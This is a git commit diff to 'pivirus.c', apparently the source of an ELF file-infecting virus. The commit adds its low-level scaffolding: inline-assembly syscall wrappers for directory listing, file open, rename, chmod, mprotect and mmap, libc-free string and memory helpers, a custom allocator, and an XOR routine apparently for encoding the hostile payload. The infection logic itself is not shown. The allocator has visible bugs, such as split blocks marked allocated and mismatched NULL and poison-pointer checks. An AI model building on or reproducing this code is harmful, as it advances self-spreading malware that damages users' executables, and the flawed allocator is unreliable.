e7337e7b5506be6eb8bcf459de8fb6a204fa872c
Mostafa Algayar <34634666+En14c@users.noreply.github.com>
2018-03-09 16:09:08 +0200

    add syscalls, memory management and string functions definitions
    modified: pivirus.c

--- pivirus.c
+++ pivirus.c
@@ -262,3 +262,218 @@ typedef struct target_elf
 
 target_elf_t *target_elf;
 mman_t mman;
+
+
+
+extern uint64_t pi_hostile_fclose(void);
+extern uint64_t pi_get_hostile_len(void);
+
+
+pi_define_syscall_1(close,3,int64_t,fd)
+
+pi_define_syscall_1(chdir,80,const char *,path)
+
+pi_define_syscall_1(exit,60,uint64_t,exit_stat);
+
+pi_define_syscall_2(fstat,5,int64_t,fd,struct stat *,stat_struct)
+
+pi_define_syscall_2(rename,82,const char *,old_name,const char *,new_name)
+    
+pi_define_syscall_2(chmod,90,const char *,filename,int64_t,mode)
+
+pi_define_syscall_2(munmap,11,uint64_t,addr,uint64_t,size);
+
+pi_define_syscall_3(open,2,const char *,path,int64_t,flags,int64_t,mode)
+
+pi_define_syscall_3(read,0,int64_t,fd,void *,buf,uint64_t,count)
+
+pi_define_syscall_3(write,1,int64_t,fd,const char *,buf,uint64_t,count)
+
+pi_define_syscall_3(mprotect,10,void *,addr,uint64_t,len,int64_t,prot)
+
+pi_define_syscall_3(getdents64,217,int64_t,fd,char *,buf,uint64_t,buf_sz)
+
+pi_define_syscall_3(lseek,8,int64_t,fd,int64_t,offset,int64_t,whence)
+
+
+void *pi_mmap(void *addr,uint64_t len,int64_t prot,int64_t flags,int64_t fd,int64_t offset)
+{
+    uint64_t __ret;
+
+    __asm__ volatile 
+        (
+         "movq $9,%%rax             \n"
+         "movq %0,%%rdi             \n"
+         "movq %1,%%rsi             \n"
+         "movq %2,%%rdx             \n"
+         "movq %3,%%r10             \n"
+         "movq %4,%%r8              \n"
+         "movq %5,%%r9              \n"
+         "syscall"
+         :
+         : "g" (addr), "g" (len), "g" (prot), "g" (flags), "g" (fd), "g" (offset)
+        );
+
+    __asm__
+        (
+         "movq  %%rax,%0"
+         : "=g" (__ret)
+        );
+
+    return (void *)(__ret);
+
+}
+
+
+
+
+inline_function void pi_strcpy(char *dest,const char *src)
+{
+    while (*src) *dest++ = *src++;
+    *dest = *src;
+}
+
+
+inline_function uint64_t pi_strlen(const char *str)
+{
+    uint64_t len = 0;
+    
+    while (*str++) ++len;
+    
+    return len;
+}
+
+inline_function void pi_memcpy(void *dest,void *src,uint64_t len)
+{
+    while(len--) *((uint8_t *)dest++) = *((uint8_t *)src++);
+}
+
+inline_function int64_t pi_memcmp(void *mem1,void *mem2,uint64_t len)
+{
+    while (len--)
+    {
+        if (*((uint8_t *)mem1++) != *((uint8_t *)mem2++))
+            return MEM_NOT_EQUAL;
+    }
+
+    return MEM_EQUAL;
+}
+
+inline_function void pi_memset(void *mem,uint8_t val,uint64_t len)
+{
+    while (len--) *((uint8_t *)mem++) = val;
+}
+
+void pi_puts(const char *str)
+{
+    pi_write(STDOUT_FILENO,str,pi_strlen(str));
+}
+
+/*
+ * gets a memory pool that will be used by pi_malloc 
+*/
+int64_t pi_mm_getpool(void)
+{
+    mman.mm_pool_start = pi_mmap(NULL,PI_MM_POOL_SZ,PROT_WRITE | PROT_READ,MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
+    pi_check_syscall_fault(mman.mm_pool_start);
+
+    mman.mm_pool_end = mman.mm_pool_start + PI_MM_POOL_SZ;
+
+    mman.mm_cur_brk = mman.mm_pool_start;
+
+    return PI_OPERATION_SUCCESS;
+}
+
+void *pi_sbrk(uint32_t size)
+{
+    void *tmp;
+
+    tmp = (void *)mman.mm_cur_brk;
+
+    mman.mm_cur_brk += size;
+
+    if (mman.mm_cur_brk > mman.mm_pool_end)
+        return NULL;
+    
+    return tmp;
+}
+
+void *pi_malloc(uint32_t size)
+{
+    malloc_header_t *tmp1, *tmp2, *tmp3, *tmp4;
+
+    if (!mman.malloc_head)
+    {
+        mman.malloc_head = pi_sbrk(size + sizeof(malloc_header_t));
+
+        if (mman.malloc_head == PI_POISON_PTR)
+            return (void *)PI_POISON_PTR;
+
+        mman.malloc_head->stat = PI_MM_ALLOCATED;
+        mman.malloc_head->size = size;
+        mman.malloc_head->next = PI_POISON_PTR;
+
+
+        return (void *)(mman.malloc_head + 1);
+    }
+
+    //search for free block with bsize >= size
+    tmp1 = mman.malloc_head;
+    while (tmp1)
+    {
+        if ((tmp1->stat == PI_MM_FREE) && (tmp1->size >= size))
+        {
+            if (tmp1->size > size)
+            {
+                //divide the block
+                tmp3       = (malloc_header_t *)( (uint8_t *)( tmp1 + 1) + size );
+                tmp3->stat = PI_MM_ALLOCATED;
+                tmp3->size = tmp1->size - size;
+                tmp3->next = tmp1->next;
+                tmp1->next = tmp3;
+                goto __ret;
+            }
+            tmp1->stat = PI_MM_ALLOCATED;
+__ret:
+            return (void *)(tmp1 + 1);
+        }
+        tmp4 = tmp1;
+        tmp1 = tmp1->next;
+    }
+
+    tmp2 = pi_sbrk(size + sizeof(malloc_header_t));
+
+    if (tmp2 == PI_POISON_PTR)
+        return (void *)PI_POISON_PTR;
+
+    tmp2->size = size;
+    tmp2->stat = PI_MM_ALLOCATED;
+    tmp2->next = PI_POISON_PTR;
+
+    tmp4->next = tmp2;
+
+    pi_memset(tmp2 + 1,0x0,tmp2->size);
+
+    return (void *)(tmp2 + 1);
+}
+
+/*
+ * a simple free that just frees the block at the given address
+ * there is no adjacent free blocks coalescing
+*/ 
+void pi_free(void *ptr)
+{
+    malloc_header_t *tmp1;
+
+    tmp1 = (malloc_header_t *)ptr - 1;
+    tmp1->stat = PI_MM_FREE;
+
+    pi_memset(tmp1 + 1,0x0,tmp1->size);
+}
+
+
+inline_function void pi_xor_mem(void *mem,uint64_t len,uint8_t xor_key)
+{
+    while (len--) *((uint8_t *)mem++) ^= xor_key;
+}
+
